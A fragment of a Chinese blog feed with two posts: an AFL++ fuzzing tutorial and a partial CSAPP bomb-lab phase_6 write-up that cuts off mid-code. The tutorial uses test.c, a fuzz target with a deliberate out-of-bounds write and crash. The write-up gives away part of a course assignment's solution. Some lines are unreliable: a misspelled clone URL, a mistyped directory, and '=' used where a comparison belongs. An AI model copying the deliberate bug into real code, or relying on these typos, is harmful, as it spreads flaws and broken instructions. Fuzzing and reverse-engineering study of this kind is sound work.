        <content type="html"><![CDATA[<h2 id="比较有名的Fuzz工具"><a href="#比较有名的Fuzz工具" class="headerlink" title="比较有名的Fuzz工具"></a>比较有名的Fuzz工具</h2><p><img src="/2024/08/01/fuzz/afl/image-20240801102741189.png" alt="image-20240801102741189"></p><h2 id="Fuzz流程"><a href="#Fuzz流程" class="headerlink" title="Fuzz流程"></a>Fuzz流程</h2><p><img src="/2024/08/01/fuzz/afl/image-20240801162250704.png" alt="image-20240801162250704"></p><h2 id="AFL原理"><a href="#AFL原理" class="headerlink" title="AFL原理"></a>AFL原理</h2><p><img src="/2024/08/01/fuzz/afl/image-20240802170615459.png" alt="image-20240802170615459"></p><h3 id="fork-server"><a href="#fork-server" class="headerlink" title="fork-server"></a>fork-server</h3><p>作用：如上图，相当于目标程序和afl-fuzz的中间媒介，相当于一个传递测试用例和执行结果的管道。</p><p>优化 AFL 在模糊测试中执行目标程序的方式，从而加速测试过程并降低资源消耗。</p><p>主要原理：fork-server在程序启动后，会将其保留在内存中，并提供一个通信接口，这样之后AFL每次生成测试用例向目标程序发送时都需要重新加载和初始化目标程序所带来的开销。从而可以达到减少启动时间和资源消耗、通信和控制、效率提升的作用。</p><p>实现细节：AFL通过在启动目标程序时创建子进程（fork）来实现fork-server。，这个fork的功能是加载目标程序并等待AFL发送测试用例，然后通过管道或其他IPC（进程间通信）机制将测试用例发送给fork-server，然后frok-server会将测试用例发送给目标程序执行，并将执行结果返回给AFL。</p><h3 id="确定性变异"><a href="#确定性变异" class="headerlink" title="确定性变异"></a>确定性变异</h3><ol><li>位翻转</li><li>字节翻转</li><li>添加或删除字节</li></ol><h3 id="不确定性变异"><a href="#不确定性变异" class="headerlink" title="不确定性变异"></a>不确定性变异</h3><ol><li>随机数生成</li><li>基于系统时间的变异</li><li>从外部源（如文件、网络请求）获取的数据等。</li></ol><h2 id="AFL的Fuzz方式"><a href="#AFL的Fuzz方式" class="headerlink" title="AFL的Fuzz方式"></a>AFL的Fuzz方式</h2><ol><li>开源软件：AFL软件进行编译的同时进行插桩，以方便Fuzz</li><li>闭源软件：配合QEMU直接对闭源的二进制代码进行Fuzz</li></ol><h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><h3 id="语料库"><a href="#语料库" class="headerlink" title="语料库"></a>语料库</h3><p>就是我们要从语料库中选择种子，语料库就是模糊测试数据的集合，种子就是其中的一个数据。</p><h3 id="插桩"><a href="#插桩" class="headerlink" title="插桩"></a>插桩</h3><p>即在程序中的一些地方插入输出代码，来检测程序执行到了哪里。</p><p><img src="/2024/08/01/fuzz/afl/image-20240801110148179.png" alt="image-20240801110148179"></p><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p><img src="/2024/08/01/fuzz/afl/image-20240801111149620.png" alt="image-20240801111149620"></p><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> had_exec<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    had_exec<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">//(1)</span><span class="token comment">//...</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>had_exec<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>had_exec<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//...</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>had_exec<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">//(2)</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"function a had has been called"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="AFL-的使用"><a href="#AFL-的使用" class="headerlink" title="AFL++ 的使用"></a>AFL++ 的使用</h2><h3 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> afl++<span class="token function">git</span> clone https://github.com/AFLplusplus/ASLplusplus.git<span class="token builtin class-name">cd</span> AFLplusplus<span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>装到了<code>ubantu</code>的<code>Fuzz-tools/AFLplusplus</code>文件夹下，运行<code>afl-fuzz --version</code>查看版本</p><h3 id="1、开源fuzz"><a href="#1、开源fuzz" class="headerlink" title="1、开源fuzz"></a>1、开源fuzz</h3><h4 id="测试程序test-c"><a href="#测试程序test-c" class="headerlink" title="测试程序test.c"></a>测试程序<code>test.c</code></h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token punctuation">,</span> idx<span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span>    buf<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">,</span> <span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">0xdead</span><span class="token punctuation">)</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0</span> <span class="token operator">=</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="使用AFL-对test-c进行模糊测试"><a href="#使用AFL-对test-c进行模糊测试" class="headerlink" title="使用AFL++对test.c进行模糊测试"></a>使用AFL++对test.c进行模糊测试</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">AFL_USE_ASAN</span><span class="token operator">=</span><span class="token number">1</span>afl-gcc -fsanitize<span class="token operator">=</span>address test.c -o <span class="token builtin class-name">test</span>   <span class="token comment"># 使用afl-gcc对test.c进行编译</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2024/08/01/fuzz/afl/image-20240801201521060.png" alt="image-20240801201521060"></p><h4 id="afl-as"><a href="#afl-as" class="headerlink" title="afl-as"></a><code>afl-as</code></h4><p><img src="/2024/08/01/fuzz/afl/image-20240801164105285.png" alt="image-20240801164105285"></p><h4 id="afl-fuzz命令"><a href="#afl-fuzz命令" class="headerlink" title="afl-fuzz命令"></a>afl-fuzz命令</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">afl-fuzz -i seed-dir -o out-dir -m none ./test<span class="token comment"># 其他参数</span>-x    <span class="token comment"># 指定字典，afl-fuzz过程中会将字典中的数据包含到-i的原始输入数据的变异样本当中去</span>-M <span class="token number">4</span>   <span class="token comment"># 并行fuzzing实例数，此处并行4个fuzzing实例</span>-S   <span class="token comment"># 指定随机种子，会影响随机变异输入。后面可以跟一个整数值或者文件路径。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/08/01/fuzz/afl/image-20240801164655880.png" alt="image-20240801164655880"></p><h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p>fuzz的结果输出到了<code>out-dir/default/crashes</code>目录下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /out-dir/defalut/crashes<span class="token function">ls</span>    <span class="token comment"># 即可查看到crash信息</span>./test.out <span class="token operator">&lt;</span> out-dir/default/crashes/id:000000,sig:11,src:000000,time:46,execs:10,op:quick,pos:0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2、闭源fuzz"><a href="#2、闭源fuzz" class="headerlink" title="2、闭源fuzz"></a>2、闭源fuzz</h3><h4 id="运行qemu的编译脚本"><a href="#运行qemu的编译脚本" class="headerlink" title="运行qemu的编译脚本"></a>运行qemu的编译脚本</h4><p>qemu是基于路径信息覆盖制导的fuzz技术</p><p>分别为x86    arm      交叉编译的arm下</p><p><img src="/2024/08/01/fuzz/afl/image-20240805184627096.png" alt="image-20240805184627096"></p><p>然后，假设test.c是测试程序</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/    <span class="token comment"># cd到AFLplusplus目录下</span><span class="token function">make</span> <span class="token function">install</span> gcc test.c -o test.out   <span class="token comment"># 因为是闭源fuzz，所以我们不使用afl-gcc来编译</span>afl-fuzz -i input-dir/ -o output-dir/ -m none -Q ./test.out  <span class="token comment"># -Q 就是使用qemu </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="crash分析"><a href="#crash分析" class="headerlink" title="crash分析"></a>crash分析</h2><h3 id="1、Sanitizer"><a href="#1、Sanitizer" class="headerlink" title="1、Sanitizer"></a>1、Sanitizer</h3><p>如果不开启Sanitizer，即使程序存在漏洞，如果没有执行到有漏洞的代码段，那么程序也不会出现异常，这样Fuzz的效率就会大大降低。</p><p>开启Sanitizer后，虽然性能和时间上会有所损耗，但找bug的能力会大大提高。</p><h3 id="2、AdressSanitizer"><a href="#2、AdressSanitizer" class="headerlink" title="2、AdressSanitizer"></a>2、AdressSanitizer</h3><p><img src="/2024/08/01/fuzz/afl/image-20240801192256882.png" alt="image-20240801192256882"></p><p><img src="/2024/08/01/fuzz/afl/image-20240801192330585.png" alt="image-20240801192330585"></p><p><img src="/2024/08/01/fuzz/afl/image-20240801192451238.png" alt="image-20240801192451238"></p><h3 id="3、ThreadSanitizer"><a href="#3、ThreadSanitizer" class="headerlink" title="3、ThreadSanitizer"></a>3、ThreadSanitizer</h3><h3 id="4、UndefinedBehaviorSanitizer"><a href="#4、UndefinedBehaviorSanitizer" class="headerlink" title="4、UndefinedBehaviorSanitizer"></a>4、UndefinedBehaviorSanitizer</h3><h3 id="5、MemorySanitizer"><a href="#5、MemorySanitizer" class="headerlink" title="5、MemorySanitizer"></a>5、MemorySanitizer</h3><h2 id="AFL-Fuzz实战"><a href="#AFL-Fuzz实战" class="headerlink" title="AFL-Fuzz实战"></a>AFL-Fuzz实战</h2><h3 id="1、测试对象：libpng"><a href="#1、测试对象：libpng" class="headerlink" title="1、测试对象：libpng"></a>1、测试对象：libpng</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://nchc.dl.sourceforge.net/project/libpng/libpng16/1.6.36/libpng-1.6.36.tar.xz  <span class="token comment"># 下载libpng项目</span><span class="token function">tar</span> xvf libpng-1.6.36.tar.gz    <span class="token comment"># 解压</span><span class="token builtin class-name">cd</span> libpng-1.6.36./autogen.sh<span class="token comment"># 把编译器指定为afl的编译器</span><span class="token assign-left variable">CC</span><span class="token operator">=</span>afl-clang-fast <span class="token assign-left variable">CXX</span><span class="token operator">=</span>afl-clang-fast++ ./configure --enable-static  <span class="token comment"># afl-clang是另一个编译器  # --enable-static  用于生成静态库，fuzz开源库时会需要</span><span class="token function">make</span> -j4<span class="token comment"># 编译</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、准备环境（准备种子）"><a href="#2、准备环境（准备种子）" class="headerlink" title="2、准备环境（准备种子）"></a>2、准备环境（准备种子）</h3><p>获取官网提供的测试集作为输入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> huzz_in fuzz_out<span class="token builtin class-name">cd</span> fuzz_in<span class="token function">wget</span> http://lcamtuf.coredump.cx/afl/demo/afl_testcases.tgz<span class="token function">tar</span> vxf afl_testcases.tgz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、开始fuzz"><a href="#3、开始fuzz" class="headerlink" title="3、开始fuzz"></a>3、开始fuzz</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">afl-fuzz -i fuzz_in/png/full/images -o fuzz_out .libs/pngimage @@    <span class="token comment"># @@代表测试输入样本</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="/2024/08/01/fuzz/afl/image-20240801201702678.png" alt="image-20240801201702678"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP-lab2-phase_6</title>
      <link href="/2024/07/30/er-jin-zhi-an-quan/csapp-lab2-phase-6/"/>
      <url>/2024/07/30/er-jin-zhi-an-quan/csapp-lab2-phase-6/</url>
      
        <content type="html"><![CDATA[<h2 id="汇编代码"><a href="#汇编代码" class="headerlink" title="汇编代码"></a>汇编代码</h2><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">   0x00000000004010f4 &lt;+0&gt;:push   r14   0x00000000004010f6 &lt;+2&gt;:push   r13   0x00000000004010f8 &lt;+4&gt;:push   r12   0x00000000004010fa &lt;+6&gt;:push   rbp   0x00000000004010fb &lt;+7&gt;:push   rbx   0x00000000004010fc &lt;+8&gt;:sub    rsp,0x50   0x0000000000401100 &lt;+12&gt;:mov    r13,rsp    ; r13=rsp   0x0000000000401103 &lt;+15&gt;:mov    rsi,rsp    ; rsi=rsp   0x0000000000401106 &lt;+18&gt;:call   0x40145c &lt;read_six_numbers&gt;   0x000000000040110b &lt;+23&gt;:mov    r14,rsp ; r14=rsp   0x000000000040110e &lt;+26&gt;:mov    r12d,0x0; i=0     ; Part-1   输入六个数字，都必须满足&lt;=6  loop1   0x0000000000401114 &lt;+32&gt;:mov    rbp,r13; rbp=r13=rsp   0x0000000000401117 &lt;+35&gt;:mov    eax,DWORD PTR [r13+0x0]; eax = rsp   0x000000000040111b &lt;+39&gt;:sub    eax,0x1; eax-1   0x000000000040111e &lt;+42&gt;:cmp    eax,0x5   0x0000000000401121 &lt;+45&gt;:jbe    0x401128 &lt;phase_6+52&gt;; eax-1 &lt;= 5 ==&gt;  eax &lt;= 6   0x0000000000401123 &lt;+47&gt;:call   0x40143a &lt;explode_bomb&gt;   ; Part-2  实现数组中每个数都各不相同   0x0000000000401128 &lt;+52&gt;:add    r12d,0x1; i+1   0x000000000040112c &lt;+56&gt;:cmp    r12d,0x6; 要循环六个数，i &lt; 6   0x0000000000401130 &lt;+60&gt;:je     0x401153 &lt;phase_6+95&gt;   0x0000000000401132 &lt;+62&gt;:mov    ebx,r12d; ebx=i+1   ; if(j &lt;= 5)  loop2   0x0000000000401135 &lt;+65&gt;:movsxd rax,ebx; rax=ebx=j   0x0000000000401138 &lt;+68&gt;:mov    eax,DWORD PTR [rsp+rax*4]; eax=arr[j]   0x000000000040113b &lt;+71&gt;:cmp    DWORD PTR [rbp+0x0],eax; arr[i+1] 和 arr[i]进行比较   0x000000000040113e &lt;+74&gt;:jne    0x401145 &lt;phase_6+81&gt;; arr[i+1] != arr[i]   0x0000000000401140 &lt;+76&gt;:call   0x40143a &lt;explode_bomb&gt;   ; if arr[i+1] != arr[i]   0x0000000000401145 &lt;+81&gt;:add    ebx,0x1; j++   0x0000000000401148 &lt;+84&gt;:cmp    ebx,0x5; 判断j是否越界   0x000000000040114b &lt;+87&gt;:jle    0x401135 &lt;phase_6+65&gt;   0x000000000040114d &lt;+89&gt;:add    r13,0x4; r13+4   0x0000000000401151 &lt;+93&gt;:jmp    0x401114 &lt;phase_6+32&gt;   ; Part-3  实现arr[m] = 7-arr[m]   0x0000000000401153 &lt;+95&gt;:lea    rsi,[rsp+0x18]; &amp;rsi=&amp;arr[5]   0x0000000000401158 &lt;+100&gt;:mov    rax,r14; rax=r14=rsp ==&gt; m=0   0x000000000040115b &lt;+103&gt;:mov    ecx,0x7 ; ecx=7   ; if(m &lt; 6) loop3   0x0000000000401160 &lt;+108&gt;:mov    edx,ecx; edx=ecx=7   0x0000000000401162 &lt;+110&gt;:sub    edx,DWORD PTR [rax]; edx=7-arr[m]   0x0000000000401164 &lt;+112&gt;:mov    DWORD PTR [rax],edx; arr[m] = 7-arr[m]   0x0000000000401166 &lt;+114&gt;:add    rax,0x4; m++   0x000000000040116a &lt;+118&gt;:cmp    rax,rsi; m &lt; 6   0x000000000040116d &lt;+121&gt;:jne    0x401160 &lt;phase_6+108&gt;   ; Part-4   把node进行从小到大排序，依次放入栈中   0x000000000040116f &lt;+123&gt;:mov    esi,0x0; esi=0 ==&gt; k=0    0x0000000000401174 &lt;+128&gt;:jmp    0x401197 &lt;phase_6+163&gt;   ; if(arr[k] &gt; count)   0x0000000000401176 &lt;+130&gt;:mov    rdx,QWORD PTR [rdx+0x8]; edx = node[k]-&gt;next   0x000000000040117a &lt;+134&gt;:add    eax,0x1; count++   eax==&gt;count   0x000000000040117d &lt;+137&gt;:cmp    eax,ecx; 判断arr[k]是否等于count++   0x000000000040117f &lt;+139&gt;:jne    0x401176 &lt;phase_6+130&gt;   0x0000000000401181 &lt;+141&gt;:jmp    0x401188 &lt;phase_6+148&gt;; 当前node入栈   ; if(arr[k] &lt;= 1)      0x0000000000401183 &lt;+143&gt;:mov    edx,0x6032d0; edx=0x6032d0 ==&gt;  node1   ; if(arr[k] &lt;= count)   0x0000000000401188 &lt;+148&gt;:mov    QWORD PTR [rsp+rsi*2+0x20],rdx; 把当前edx中存储的node压入栈中   0x000000000040118d &lt;+153&gt;:add    rsi,0x4; k++   0x0000000000401191 &lt;+157&gt;:cmp    rsi,0x18; k &lt; 6   0x0000000000401195 &lt;+161&gt;:je     0x4011ab &lt;phase_6+183&gt;   ; if(k &lt;= 5)   0x0000000000401197 &lt;+163&gt;:mov    ecx,DWORD PTR [rsp+rsi*1]; ecx=arr[k]   0x000000000040119a &lt;+166&gt;:cmp    ecx,0x1   0x000000000040119d &lt;+169&gt;:jle    0x401183 &lt;phase_6+143&gt;   ; if(arr[k] &gt; 1)   0x000000000040119f &lt;+171&gt;:mov    eax,0x1; count=1   eax==&gt;count   0x00000000004011a4 &lt;+176&gt;:mov    edx,0x6032d0; edx = node1   0x00000000004011a9 &lt;+181&gt;:jmp    0x401176 &lt;phase_6+130&gt;   ; Part-5   将入栈后的node按入栈顺序链接起来   ; if(k &gt; 5)   跳出Part-4   0x00000000004011ab &lt;+183&gt;:mov    rbx,QWORD PTR [rsp+0x20]; rbx = nod1  将入栈后的node按顺序依次记为nod1....nod6   0x00000000004011b0 &lt;+188&gt;:lea    rax,[rsp+0x28]; rax = nod2   0x00000000004011b5 &lt;+193&gt;:lea    rsi,[rsp+0x50]; rsi = nod6后面的位置，即栈帧边界   0x00000000004011ba &lt;+198&gt;:mov    rcx,rbx; rcx = rbx = nod1   ; if(n &lt; 6)   0x00000000004011bd &lt;+201&gt;:mov    rdx,QWORD PTR [rax]; rdx = rax = nod2   0x00000000004011c0 &lt;+204&gt;:mov    QWORD PTR [rcx+0x8],rdx; nod1-&gt;next = nod2   0x00000000004011c4 &lt;+208&gt;:add    rax,0x8; rax = rax-&gt;next = nod3   0x00000000004011c8 &lt;+212&gt;:cmp    rax,rsi  ; 判断是否越界   0x00000000004011cb &lt;+215&gt;:je     0x4011d2 &lt;phase_6+222&gt;   ; if(n &lt; 6)   0x00000000004011cd &lt;+217&gt;:mov    rcx,rdx; rcx = rdx = nod2   0x00000000004011d0 &lt;+220&gt;:jmp    0x4011bd &lt;phase_6+201&gt;   ; Part-6   判断入栈的nod序列的weight是否是从大到小排序的，如果不是（例如 nod1.weight &lt; nod2.weight），则炸弹爆炸   ; if(n &gt;= 6)   0x00000000004011d2 &lt;+222&gt;:mov    QWORD PTR [rdx+0x8],0x0; nod[6]-&gt;next = 0   0x00000000004011da &lt;+230&gt;:mov    ebp,0x5; ebp = 5  ==&gt; con=5   ; if(con &gt; 0) loop   0x00000000004011df &lt;+235&gt;:mov    rax,QWORD PTR [rbx+0x8];rax = nod1-&gt;next = nod2   0x00000000004011e3 &lt;+239&gt;:mov    eax,DWORD PTR [rax]; eax = nod2.weight   0x00000000004011e5 &lt;+241&gt;:cmp    DWORD PTR [rbx],eax=&gt; 0x00000000004011e7 &lt;+243&gt;:jge    0x4011ee &lt;phase_6+250&gt;; if(nod1.weight &gt;= nod2.weight)   0x00000000004011e9 &lt;+245&gt;:call   0x40143a &lt;explode_bomb&gt;   ; if(nod1.weight &gt;= nod2.weight)   0x00000000004011ee &lt;+250&gt;:mov    rbx,QWORD PTR [rbx+0x8]; rbx = rbx-&gt;next   0x00000000004011f2 &lt;+254&gt;:sub    ebp,0x1;ebp-- ==&gt; con--   0x00000000004011f5 &lt;+257&gt;:jne    0x4011df &lt;phase_6+235&gt;   ; 程序结束   0x00000000004011f7 &lt;+259&gt;:add    rsp,0x50   0x00000000004011fb &lt;+263&gt;:pop    rbx   0x00000000004011fc &lt;+264&gt;:pop    rbp   0x00000000004011fd &lt;+265&gt;:pop    r12   0x00000000004011ff &lt;+267&gt;:pop    r13   0x0000000000401201 &lt;+269&gt;:pop    r14   0x0000000000401203 &lt;+271&gt;:ret <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Part-1"><a href="#Part-1" class="headerlink" title="Part-1"></a>Part-1</h2><p>输入六个数字，都必须满足arr[i] - 1 &lt;= 5</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span>        <span class="token function">bomb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Part-2"><a href="#Part-2" class="headerlink" title="Part-2"></a>Part-2</h2><p>六个数字必须各不相同</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token function">bomb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以我们输入 <code>1 2 3 4 5 6</code></p><h2 id="Part-3"><a href="#Part-3" class="headerlink" title="Part-3"></a>Part-3</h2><p>实现<code>arr[m] = 7-arr[m]</code></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">for</span><span class="token punctuation">(</span>m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> m <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">;</span> m<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    arr<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">7</span><span class="token operator">-</span>arr<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输入的数变为<code>6 5 4 3 2 1</code></p><h2 id="Part-4"><a href="#Part-4" class="headerlink" title="Part-4"></a>Part-4</h2><p>令人费解的地方</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">0x0000000000401188 &lt;+148&gt;:mov    QWORD PTR [rsp+rsi*2+0x20],rdx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首先在内存中有链表node1……node6 一一对应 1 2 3 4 5 6</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> weight<span class="token punctuation">;</span><span class="token comment">//表示权重</span>    <span class="token keyword">int</span> value<span class="token punctuation">;</span><span class="token comment">//表示的是这个node是第几个node</span>    node <span class="token operator">*</span> next<span class="token punctuation">;</span><span class="token punctuation">}</span>node<span class="token punctuation">;</span>node <span class="token operator">*</span> node1<span class="token punctuation">,</span>node2<span class="token punctuation">,</span>node3<span class="token punctuation">,</span>node4<span class="token punctuation">,</span>node5<span class="token punctuation">,</span>node6<span class="token punctuation">;</span>node1<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>node1<span class="token operator">-&gt;</span>next <span class="token operator">=</span> node2<span class="token punctuation">;</span>node2<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>node2<span class="token operator">-&gt;</span>next <span class="token operator">=</span> node3<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>node6<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对Part-4反编译可以是下面这样的伪代码：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">node <span class="token operator">*</span> nod <span class="token operator">=</span> node1<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>count <span class="token operator">=</span> <span class="token number">1</span><span class="token 